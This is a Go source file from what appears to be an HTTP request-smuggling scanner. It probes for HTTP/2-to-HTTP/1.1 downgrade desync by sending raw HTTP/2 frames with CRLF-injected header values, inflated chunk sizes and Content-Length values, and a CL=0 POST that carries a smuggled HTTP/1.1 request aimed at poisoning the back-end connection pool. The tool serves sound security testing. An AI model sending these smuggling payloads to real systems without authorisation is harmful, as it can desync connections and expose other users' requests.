package scan

// h2.go — HTTP/2 downgrade desync detection
//
// Maps to HTTP2Scan.java, H2TunnelScan.java, HiddenHTTP2.java.
//
// Strategy:
// When a front-end accepts HTTP/2 and downgrades to HTTP/1.1 for the back-end,
// H2-specific headers or header injection can smuggle a request that the back-end
// sees as a second, separate HTTP/1.1 request.
//
// We use Go's net/http with HTTP/2 forced via h2c or TLS-ALPN, then craft
// requests with injected newlines in header values (H2.TE, H2.CL).
//
// Note: true H2 framing with injected CRLF in header values requires
// a custom HPACK encoder — here we approximate via golang.org/x/net/http2
// and test the most reliable downgrade vectors.

import (
	"github.com/smuggled/smuggled/internal/request"
	"github.com/smuggled/smuggled/internal/config"
	"bytes"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"

	"github.com/smuggled/smuggled/internal/report"
)

// ScanH2Downgrade probes for HTTP/2 → HTTP/1.1 downgrade desync vectors.
func ScanH2Downgrade(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("H2Downgrade")
	if target.Scheme != "https" {
		rep.Log("H2Downgrade: skipping non-HTTPS target %s", target.Host)
		return
	}

	rep.Log("H2Downgrade probe: %s", target.Host)

	// First check if server supports HTTP/2
	if !request.ProbeH2(target, cfg) {
		rep.Log("H2Downgrade: %s does not advertise h2 via ALPN, skipping", target.Host)
		return
	}

	path := target.RequestURI()
	if path == "" {
		path = "/"
	}
	host := target.Hostname()

	// ── H2.TE: chunk-size inflation attack ──────────────────────────────────
	//
	// Mirrors HTTP2Scan.java exactly:
	//   syncedReq  = makeChunked(original, 0, 0,  config, false)  // correct chunk size
	//   attackReq  = makeChunked(original, 0, 10, config, false)  // chunk size inflated +10
	//
	// The attack body declares chunk size = bodySize + 10 but only provides
	// bodySize bytes of data. The back-end (TE) reads the declared size,
	// finds insufficient data, and waits for the remaining bytes → TIMEOUT.
	//
	// CL = full body length in BOTH cases (NO truncation). In H2 the front-end
	// uses DATA frames (not CL) to delimit the body, so CL truncation has no
	// effect. The attack relies solely on the inflated chunk size.
	const h2TEChunkData = "x=y"
	const h2TEChunkOffset = 10

	// Attack body: chunk declares 13 bytes but only 3 available
	//   "d\r\nx=y\r\n0\r\n\r\n"
	// Back-end reads "d" (13), reads 3 bytes "x=y", reads "\r\n0\r\n\r\n" (7 bytes)
	// as chunk data → still needs 3 more bytes → waits → TIMEOUT
	attackChunkSize := len(h2TEChunkData) + h2TEChunkOffset // 13
	h2TEAttackBody := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", attackChunkSize, h2TEChunkData)

	// Synced body: chunk size matches actual data → processes normally
	//   "3\r\nx=y\r\n0\r\n\r\n"
	syncedChunkSize := len(h2TEChunkData) // 3
	h2TESyncedBody := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", syncedChunkSize, h2TEChunkData)

	// Techniques are split into two groups:
	//
	// Group A — clean H2 headers (no CRLF in value). These use the standard
	//   h2RawRequest which creates separate well-formed H2 headers. The server
	//   won't reject them with PROTOCOL_ERROR. This mirrors the Java plugin's
	//   "vanilla" and other H2-specific permutations that don't rely on CRLF.
	//
	// Group B — CRLF-injected values. These embed \r\n inside a single header
	//   value to create multiple headers when downgraded to H1. Some H2 servers
	//   accept this (buggy validation); most reject with PROTOCOL_ERROR.
	//   These are tried AFTER Group A as a fallback.

	type h2TEProbe struct {
		name       string
		headerName string
		value      string
		useRaw     bool // true = use h2RawRequest (clean H2 headers), false = h2RequestWithInjectedHeader
	}

	teProbes := []h2TEProbe{
		// ── Group A: clean H2 headers ─────────────────────────────────────
		// "vanilla": plain transfer-encoding: chunked — the most important test.
		// If the front-end preserves TE when downgrading H2→H1, the back-end
		// processes the body as chunked and the inflated chunk size causes timeout.
		{"H2.TE-vanilla", "transfer-encoding", "chunked", true},

		// ── Group B: CRLF-injected values (fallback) ──────────────────────
		{"H2.TE-crlf", "transfer-encoding", "chunked\r\nTransfer-Encoding: chunked", false},
		{"H2.TE-lf", "transfer-encoding", "chunked\nTransfer-Encoding: chunked", false},
		{"H2.CL-inject", "transfer-encoding", "0\r\nContent-Length: 99", false},
		{"H2.host-inject", "transfer-encoding", host + "\r\nTransfer-Encoding: chunked", false},
	}

	timeoutThreshold := time.Duration(float64(cfg.Timeout) * request.TimeoutRatio)

	dbg(cfg, "H2.TE synced body: %q (%d bytes)", h2TESyncedBody, len(h2TESyncedBody))
	dbg(cfg, "H2.TE attack body: %q (%d bytes), declared chunk=%d actual=%d",
		h2TEAttackBody, len(h2TEAttackBody), attackChunkSize, len(h2TEChunkData))
	dbg(cfg, "H2.TE timeout threshold: %v (ratio=%.2f of %v)", timeoutThreshold, request.TimeoutRatio, cfg.Timeout)

	// h2TESend dispatches to the correct sender. Returns:
	//   body    — DATA frame payload (may be empty for legitimate 204/redirects)
	//   status  — :status pseudo-header (0 if no HEADERS frame was received,
	//             which we treat as "genuine failure" in v10b detection)
	//   elapsed — only meaningful for the useRaw=false path; for useRaw=true
	//             h2TESendTimed measures it externally
	//   err     — transport-level error
	//
	//   useRaw=true  → h2RawRequest (clean H2 headers, no CRLF in values)
	//   useRaw=false → h2RequestWithInjectedHeader (CRLF embedded in value)
	h2TESend := func(probe h2TEProbe, body string) ([]byte, int, time.Duration, error) {
		if probe.useRaw {
			extra := map[string]string{probe.headerName: probe.value}
			resp, err := h2RawRequest(target, "POST", path, host, body, extra, cfg)
			if err != nil {
				return nil, 0, 0, err
			}
			return resp.Body, resp.Status, 0, nil
		}
		return h2RequestWithInjectedHeader(target, path, host,
			probe.headerName, probe.value, cfg, body, "")
	}

	// h2TESendTimed wraps h2TESend with timing measurement for h2RawRequest
	h2TESendTimed := func(probe h2TEProbe, body string) ([]byte, int, time.Duration, error) {
		start := time.Now()
		resp, status, elapsed, err := h2TESend(probe, body)
		if probe.useRaw {
			elapsed = time.Since(start)
		}
		return resp, status, elapsed, err
	}

	for _, tech := range teProbes {
		rep.Log("H2Downgrade: technique=%s", tech.name)
		dbg(cfg, "H2.TE [%s] header: %s: %q (useRaw=%v)", tech.name, tech.headerName, tech.value, tech.useRaw)

		// ── Step 1: Synced baseline ─────────────────────────────────────────
		syncedResp, syncedStatus, syncedElapsed, syncedErr := h2TESendTimed(tech, h2TESyncedBody)
		if syncedErr != nil {
			rep.Log("H2Downgrade %s: synced request error: %v", tech.name, syncedErr)
			dbg(cfg, "H2.TE [%s] SYNCED → ERROR: %v", tech.name, syncedErr)
			continue
		}
		dbg(cfg, "H2.TE [%s] SYNCED → elapsed=%v status=%d resp_len=%d",
			tech.name, syncedElapsed, syncedStatus, len(syncedResp))
		if syncedElapsed > timeoutThreshold {
			dbg(cfg, "H2.TE [%s] SYNCED timed out (%v > %v) — skipping", tech.name, syncedElapsed, timeoutThreshold)
			continue
		}

		// ── Step 2: Attack probe (inflated chunk size) ──────────────────────
		resp, attackStatus, elapsed, err := h2TESendTimed(tech, h2TEAttackBody)
		if err != nil {
			rep.Log("H2Downgrade %s: attack error: %v", tech.name, err)
			dbg(cfg, "H2.TE [%s] ATTACK → ERROR: %v", tech.name, err)
			continue
		}
		dbg(cfg, "H2.TE [%s] ATTACK → elapsed=%v status=%d resp_len=%d timeout=%v",
			tech.name, elapsed, attackStatus, len(resp), elapsed > timeoutThreshold)
		if len(resp) > 0 {
			dbg(cfg, "H2.TE [%s] ATTACK resp body (first 200): %q", tech.name, string(resp[:min(200, len(resp))]))
		}

		// v10a: timeout-based or delay-based detection
		delayed := cfg.IsDelayed(elapsed)
		if elapsed > timeoutThreshold || delayed {
			// Confirm synced still works
			_, _, syncedElapsed2, _ := h2TESendTimed(tech, h2TESyncedBody)
			if syncedElapsed2 > timeoutThreshold {
				rep.Log("H2Downgrade %s: synced also timed out on retry — FP, skipping", tech.name)
				continue
			}
			// Confirm attack reproduces
			_, _, attackElapsed2, _ := h2TESendTimed(tech, h2TEAttackBody)
			if attackElapsed2 <= timeoutThreshold {
				rep.Log("H2Downgrade %s: attack did not reproduce — flaky, skipping", tech.name)
				continue
			}

			// FP validation: broken TE name
			fpLabel := ""
			brokenTech := tech
			brokenTech.headerName = "zransfer-encoding"
			_, _, brokenElapsed, brokenErr := h2TESendTimed(brokenTech, h2TEAttackBody)
			if brokenErr == nil && brokenElapsed > timeoutThreshold {
				fpLabel = " (probably FP)"
				rep.Log("H2Downgrade %s: broken-TE also timed out — probable FP", tech.name)
			}

			probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\n%s: %s\r\ncontent-length: %d\r\n\r\n%s",
				path, host, tech.headerName, tech.value, len(h2TEAttackBody), h2TEAttackBody)
			sev := report.SeverityProbable
			if fpLabel != "" {
				sev = report.SeverityInfo
			}
			rep.Emit(report.Finding{
				Target:      target.String(),
				Method:      "HTTP/2",
				Severity:    sev,
				Type:        "H2.TE",
				Technique:   tech.name + fpLabel,
				Description: fmt.Sprintf("H2.TE desync v10a: H2 request with inflated chunk size "+
					"(declared %d, actual %d) caused timeout while synced request succeeded. "+
					"The back-end is processing Transfer-Encoding from the downgraded H1 request.",
					attackChunkSize, len(h2TEChunkData)),
				Evidence: fmt.Sprintf("elapsed=%v attack_chunk=%d synced_ok=true technique=%s",
					elapsed, attackChunkSize, tech.name),
				RawProbe: probe,
			})
			if cfg.ExitOnFind {
				return
			}
			continue
		}

		// v10b: connection failure detection.
		// "Genuine failure" = attack probe received no HEADERS frame (status == 0).
		// An empty body alone is NOT sufficient — legitimate 204/304/etc responses
		// have empty bodies but non-zero status.
		if attackStatus == 0 && elapsed < timeoutThreshold {
			_, syncedStatus2, _, syncedErr2 := h2TESendTimed(tech, h2TESyncedBody)
			if syncedErr2 != nil || syncedStatus2 == 0 {
				dbg(cfg, "H2.TE [%s] v10b: synced also fails (status=%d) → not TE-specific",
					tech.name, syncedStatus2)
				continue
			}
			_, attackStatus2, _, _ := h2TESendTimed(tech, h2TEAttackBody)
			if attackStatus2 != 0 {
				dbg(cfg, "H2.TE [%s] v10b: attack failure didn't reproduce (status=%d)",
					tech.name, attackStatus2)
				continue
			}

			probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\n%s: %s\r\ncontent-length: %d\r\n\r\n%s",
				path, host, tech.headerName, tech.value, len(h2TEAttackBody), h2TEAttackBody)
			rep.Emit(report.Finding{
				Target:      target.String(),
				Method:      "HTTP/2",
				Severity:    report.SeverityProbable,
				Type:        "H2.TE",
				Technique:   tech.name,
				Description: fmt.Sprintf("H2.TE desync v10b: H2 request with inflated chunk size "+
					"(declared %d, actual %d) caused connection failure while synced request succeeded.",
					attackChunkSize, len(h2TEChunkData)),
				Evidence: fmt.Sprintf("response_empty=true attack_chunk=%d synced_ok=true technique=%s",
					attackChunkSize, tech.name),
				RawProbe: probe,
			})
			if cfg.ExitOnFind {
				return
			}
			continue
		}

		// Secondary check: back-end error strings in body.
		if h2BodySuspicious(resp) {
			probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\n%s: %s\r\ncontent-length: %d\r\n\r\n%s",
				path, host, tech.headerName, tech.value, len(h2TEAttackBody), h2TEAttackBody)
			rep.Emit(report.Finding{
				Target:      target.String(),
				Method:      "HTTP/2",
				Severity:    report.SeverityProbable,
				Type:        "H2.TE",
				Technique:   tech.name,
				Description: "H2→H1 downgrade with injected TE caused back-end rejection — possible desync",
				Evidence:    fmt.Sprintf("elapsed=%v h2_body_suspicious=true", elapsed),
				RawProbe:    probe,
				RawResponse: request.Truncate(string(resp), 256),
			})
			if cfg.ExitOnFind {
				return
			}
		}
	}

	// H2.CL: inject a Content-Length that conflicts with the actual body length
	h2CLDesync(target, path, host, cfg, rep)
}

// h2RequestWithInjectedHeader sends a raw HTTP/2 request with a header whose
// value contains injected CRLF or newline sequences to test for H2→H1 downgrade.
// Returns only the DATA frame body (not HPACK header bytes) and the elapsed time.
//
// body and clOverride allow callers to set a custom DATA frame body and
// Content-Length header. When empty, defaults to body="x=y" / CL="3".
func h2RequestWithInjectedHeader(target *url.URL, path, host, headerName, headerValue string, cfg config.Config, body string, clOverride string) ([]byte, int, time.Duration, error) {
	addr := target.Hostname() + ":443"
	if p := target.Port(); p != "" {
		addr = target.Hostname() + ":" + p
	}

	tlsCfg := &tls.Config{
		ServerName:         target.Hostname(),
		InsecureSkipVerify: cfg.SkipTLSVerify, //nolint:gosec
		NextProtos:         []string{"h2"},
	}

	netDialer := &net.Dialer{Timeout: cfg.Timeout}
	rawConn, err := tls.DialWithDialer(netDialer, "tcp", addr, tlsCfg)
	if err != nil {
		return nil, 0, 0, fmt.Errorf("tls dial: %w", err)
	}
	defer rawConn.Close()

	if rawConn.ConnectionState().NegotiatedProtocol != "h2" {
		return nil, 0, 0, fmt.Errorf("server did not negotiate h2")
	}

	// Write HTTP/2 client preface
	rawConn.SetDeadline(time.Now().Add(cfg.Timeout)) //nolint:errcheck
	if _, err := rawConn.Write([]byte(http2.ClientPreface)); err != nil {
		return nil, 0, 0, err
	}

	framer := http2.NewFramer(rawConn, rawConn)
	framer.AllowIllegalWrites = true
	framer.AllowIllegalReads = true

	// Send SETTINGS frame
	if err := framer.WriteSettings(); err != nil {
		return nil, 0, 0, err
	}

	// Encode HEADERS with injected value
	var headersBuf bytes.Buffer
	enc := hpack.NewEncoder(&headersBuf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "POST"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	// Default body/CL when not overridden
	if body == "" {
		body = "x=y"
	}
	cl := clOverride
	if cl == "" {
		cl = fmt.Sprintf("%d", len(body))
	}

	enc.WriteField(hpack.HeaderField{Name: "content-type", Value: "application/x-www-form-urlencoded"})
	// Skip default CL when the injected header overrides it — emitting two
	// content-length fields violates RFC 7540 §8.1.2.6 and most H2 servers
	// reject the request with PROTOCOL_ERROR before forwarding to back-end.
	if headerName != "content-length" {
		enc.WriteField(hpack.HeaderField{Name: "content-length", Value: cl})
	}
	enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "identity"})
	// Inject the malformed/override header
	enc.WriteField(hpack.HeaderField{Name: headerName, Value: headerValue, Sensitive: false})

	dbg(cfg, "  h2Inject: sending HEADERS+DATA — %s: %q, body=%q (%d bytes), CL=%s",
		headerName, headerValue, body, len(body), cl)

	start := time.Now()

	if err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: headersBuf.Bytes(),
		EndStream:     false,
		EndHeaders:    true,
	}); err != nil {
		return nil, 0, 0, err
	}

	// Send DATA frame with body
	if err := framer.WriteData(1, true, []byte(body)); err != nil {
		return nil, 0, 0, err
	}

	// Read response frames — only collect DATA frame body, skip HPACK header bytes.
	// Must ACK server's SETTINGS frame (RFC 7540 §6.5) — without this, strict H2
	// servers send GOAWAY(SETTINGS_TIMEOUT) before processing any request.
	var dataBuf bytes.Buffer
	var respStatus string
	hpackDec := hpack.NewDecoder(4096, nil)
	// Note: rawConn.SetDeadline above already bounds the total time. Per-frame
	// deadlines would mask H2.TE timeout signals as "empty response" — rely on
	// the connection deadline instead.
	deadline := time.Now().Add(cfg.Timeout)
	for time.Now().Before(deadline) {
		frame, err := framer.ReadFrame()
		if err != nil {
			dbg(cfg, "  h2Inject: read frame error after %v: %v", time.Since(start), err)
			break
		}
		switch f := frame.(type) {
		case *http2.DataFrame:
			dataBuf.Write(f.Data())
			dbg(cfg, "  h2Inject: [DATA stream=%d len=%d end=%v]",
				f.StreamID, len(f.Data()), f.StreamEnded())
			if f.StreamEnded() {
				goto done
			}
		case *http2.HeadersFrame:
			if fields, decErr := hpackDec.DecodeFull(f.HeaderBlockFragment()); decErr == nil {
				for _, hf := range fields {
					if hf.Name == ":status" {
						respStatus = hf.Value
					}
					dbg(cfg, "  h2Inject: [HEADER] %s: %s", hf.Name, hf.Value)
				}
			}
			if f.StreamEnded() {
				goto done
			}
		case *http2.RSTStreamFrame:
			dbg(cfg, "  h2Inject: [RST_STREAM stream=%d code=%v] after %v", f.StreamID, f.ErrCode, time.Since(start))
			goto done
		case *http2.GoAwayFrame:
			dbg(cfg, "  h2Inject: [GOAWAY last_stream=%d code=%v] after %v", f.LastStreamID, f.ErrCode, time.Since(start))
			goto done
		case *http2.SettingsFrame:
			if !f.IsAck() {
				framer.WriteSettingsAck() //nolint:errcheck
				dbg(cfg, "  h2Inject: [SETTINGS ACK sent]")
			}
		case *http2.WindowUpdateFrame:
			// ignore silently
		default:
			dbg(cfg, "  h2Inject: [%T]", frame)
		}
	}
done:
	elapsed := time.Since(start)
	statusInt := 0
	if respStatus != "" {
		fmt.Sscanf(respStatus, "%d", &statusInt)
	}
	return dataBuf.Bytes(), statusInt, elapsed, nil
}

// h2BodySuspicious checks whether an H2 DATA frame body contains back-end error strings
// that indicate the injected header caused a parsing error on the downgraded H1 connection.
func h2BodySuspicious(body []byte) bool {
	body = bytes.ToLower(body)
	suspects := [][]byte{
		[]byte("unrecognised"),
		[]byte("invalid method"),
		[]byte("bad request"),
		[]byte("gpost"),
		[]byte("malformed"),
		[]byte("invalid header"),
	}
	for _, s := range suspects {
		if bytes.Contains(body, s) {
			return true
		}
	}
	return false
}

// h2CLDesync tests for H2.CL desync where CL in an H2 request conflicts with actual body.
//
// Two complementary detection strategies:
//
// Strategy A — CL=0 smuggling (classic H2.CL):
//   Send H2 POST with content-length: 0 but the DATA frame contains a smuggled
//   HTTP/1.1 request to a canary path. The H2 front-end ignores CL (uses frames),
//   but when downgrading to H1 it forwards the body. The H1 back-end reads CL=0
//   (no body), so the remaining bytes become the next request → pipeline poisoning.
//   Detection: send follow-up requests and check if any gets the canary response.
//
// Strategy B — inflated CL timeout:
//   Send H2 POST with content-length: 99 but only 3 bytes in the DATA frame.
//   The H1 back-end reads CL=99 and waits for 96 more bytes → timeout.
func h2CLDesync(target *url.URL, path, host string, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("h2CLDesync")

	// ── Strategy A: CL=0 smuggling with follow-up poisoning detection ────────
	h2CLSmuggle(target, path, host, cfg, rep)

	// ── Strategy B: inflated CL timeout ──────────────────────────────────────
	stratBCfg := cfg.WithDebugScope("StrategyB.inflatedCL")
	probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\ncontent-type: application/x-www-form-urlencoded\r\ncontent-length: 99\r\n\r\nx=y", path, host)

	resp, _, elapsed, err := h2RequestWithInjectedHeader(target, path, host,
		"content-length", "99", stratBCfg, "", "")
	if err != nil {
		return
	}

	h2clDelayed := cfg.IsDelayed(elapsed)
	if elapsed > time.Duration(float64(cfg.Timeout)*request.TimeoutRatio) || h2clDelayed {
		rep.Emit(report.Finding{
			Target:      target.String(),
			Method:      "HTTP/2",
			Severity:    report.SeverityProbable,
			Type:        "H2.CL",
			Technique:   "H2.CL-mismatch",
			Description: "H2 request with inflated Content-Length caused timeout/delay — possible H2.CL desync",
			Evidence:    fmt.Sprintf("elapsed=%v delayed=%v threshold=%v", elapsed, h2clDelayed, cfg.DelayThreshold),
			RawProbe:    probe,
			RawResponse: request.Truncate(string(resp), 256),
		})
	}
}

// h2CLSmuggle implements the classic H2.CL smuggling attack:
//   1. Send H2 POST with content-length: 0 and body = smuggled HTTP/1.1 request.
//   2. The H2 front-end sends the body in a DATA frame (H2 ignores CL).
//   3. When downgraded to H1, back-end reads CL=0 → no body → the body bytes
//      remain in the back-end connection buffer as the start of the next request.
//   4. Follow-up requests that hit the same back-end connection get the smuggled
//      request's response instead of their own → confirmed H2.CL desync.
func h2CLSmuggle(target *url.URL, path, host string, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("h2CLSmuggle")
	rep.Log("H2.CL smuggle probe (CL=0): target=%s", host)

	// Get baseline response status for comparison
	baselineCfg := cfg.WithDebugScope("baseline")
	baseline, err := h2RawRequest(target, "GET", path, host, "", nil, baselineCfg)
	if err != nil || baseline.Status == 0 {
		return
	}
	dbg(cfg, "baseline status=%d body_len=%d", baseline.Status, len(baseline.Body))

	canaryPath := config.EffectiveCanaryPath(cfg)

	// The smuggled body: a complete HTTP/1.1 request to the canary path.
	// The trailing incomplete header "Foo: " absorbs the next real request's
	// first line, preventing the back-end from seeing a double request-line.
	smuggled := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nFoo: ", canaryPath, host)

	// Send the H2.CL attack: CL=0 but DATA frame has the smuggled request
	extraHeaders := map[string]string{"content-length": "0"}

	// Repeat the attack several times — the front-end may not reuse the same
	// back-end connection on the first attempt.
	for attempt := 0; attempt < cfg.Attempts; attempt++ {
		attackCfg := cfg.WithDebugScope(fmt.Sprintf("attempt=%d.attack", attempt))
		_, err := h2RawRequest(target, "POST", path, host, smuggled, extraHeaders, attackCfg)
		if err != nil {
			rep.Log("H2.CL smuggle attack send error: %v", err)
			continue
		}

		// Send follow-up via H2 to detect poisoning
		followupCfg := cfg.WithDebugScope(fmt.Sprintf("attempt=%d.followup.h2", attempt))
		followup, err := h2RawRequest(target, "GET", path, host, "", nil, followupCfg)
		if err != nil {
			continue
		}
		dbg(cfg, "attempt=%d followup h2 status=%d baseline=%d poisoned=%v",
			attempt, followup.Status, baseline.Status,
			h2CLPoisonDetected(baseline, followup, canaryPath))

		// Detection signals:
		//   1. Follow-up got 404 (from smuggled GET /canary) when baseline was not 404
		//   2. Follow-up body contains the canary path (error page reflecting the path)
		//   3. Follow-up status differs from baseline in a way consistent with smuggling
		if h2CLPoisonDetected(baseline, followup, canaryPath) {
			probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\ncontent-length: 0\r\n\r\n%s", path, host, smuggled)
			rep.Emit(report.Finding{
				Target:   target.String(),
				Method:   "HTTP/2",
				Severity: report.SeverityConfirmed,
				Type:     "H2.CL",
				Technique: "H2.CL-zero-smuggle",
				Description: fmt.Sprintf(
					"H2.CL desync confirmed: H2 POST with content-length: 0 smuggled a request to %s. "+
						"Follow-up request (attempt %d) received status %d instead of baseline %d. "+
						"The H2 front-end ignored CL and forwarded the DATA frame body; "+
						"the H1 back-end read CL=0 and treated the body as a new request.",
					canaryPath, attempt, followup.Status, baseline.Status),
				Evidence: fmt.Sprintf(
					"baseline_status=%d followup_status=%d canary=%s attempt=%d",
					baseline.Status, followup.Status, canaryPath, attempt),
				RawProbe: probe,
			})
			return
		}

		// Also try follow-up via H1 — may hit the same back-end connection pool
		h1Req := []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host))
		h1Resp, _, _, h1Err := request.RawRequest(target, h1Req, cfg)
		if h1Err == nil && len(h1Resp) > 0 {
			h1Status := request.StatusCode(h1Resp)
			if (h1Status == 404 && baseline.Status != 404) ||
				request.ContainsStr(h1Resp, canaryPath) {
				probe := fmt.Sprintf("POST %s HTTP/2\r\nHost: %s\r\ncontent-length: 0\r\n\r\n%s", path, host, smuggled)
				rep.Emit(report.Finding{
					Target:   target.String(),
					Method:   "HTTP/2",
					Severity: report.SeverityConfirmed,
					Type:     "H2.CL",
					Technique: "H2.CL-zero-smuggle",
					Description: fmt.Sprintf(
						"H2.CL desync confirmed via H1 follow-up: smuggled request to %s "+
							"poisoned the back-end connection pool. Follow-up H1 request "+
							"(attempt %d) received status %d instead of baseline %d.",
						canaryPath, attempt, h1Status, baseline.Status),
					Evidence: fmt.Sprintf(
						"baseline_status=%d h1_followup_status=%d canary=%s attempt=%d",
						baseline.Status, h1Status, canaryPath, attempt),
					RawProbe: probe,
				})
				if cfg.ExitOnFind {
					return
				}
			}
		}
	}
}

// h2CLPoisonDetected checks whether a follow-up H2 response shows signs of
// receiving the smuggled canary response instead of its own.
func h2CLPoisonDetected(baseline, followup *h2Response, canaryPath string) bool {
	if followup == nil || followup.Status == 0 {
		return false
	}
	// Follow-up got 404 when baseline was not 404 → likely the canary path response
	if followup.Status == 404 && baseline.Status != 404 {
		return true
	}
	// Canary path appears in the follow-up response body (error page reflection)
	if request.ContainsStr(followup.Body, canaryPath) {
		return true
	}
	// Follow-up got "not found" / "Unrecognized" when baseline was 2xx
	if baseline.Status >= 200 && baseline.Status < 300 {
		if followup.Status == 405 || followup.Status == 400 {
			if h2BodySuspicious(followup.Body) {
				return true
			}
		}
	}
	return false
}
